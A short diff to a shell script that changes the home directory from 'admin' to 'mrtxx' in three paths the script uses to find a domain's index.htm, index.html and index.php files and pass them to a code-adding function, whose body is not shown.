@@ -64,19 +64,19 @@ function addCode_toFile() {
 function process_do() {
 
     # Check for index.htm
-    fileName="/home/admin/web/$domainName/public_html/index.htm"
+    fileName="/home/mrtxx/web/$domainName/public_html/index.htm"
     if [ -e $fileName ]; then
         addCode_toFile $fileName
     fi
 
     # Check for index.html
-    fileName="/home/admin/web/$domainName/public_html/index.html"
+    fileName="/home/mrtxx/web/$domainName/public_html/index.html"
     if [ -e $fileName ]; then
         addCode_toFile $fileName
     fi
 
     # Check for index.php
-    fileName="/home/admin/web/$domainName/public_html/index.php"
+    fileName="/home/mrtxx/web/$domainName/public_html/index.php"
     if [ -e $fileName ]; then
         addCode_toFile $fileName
     fi
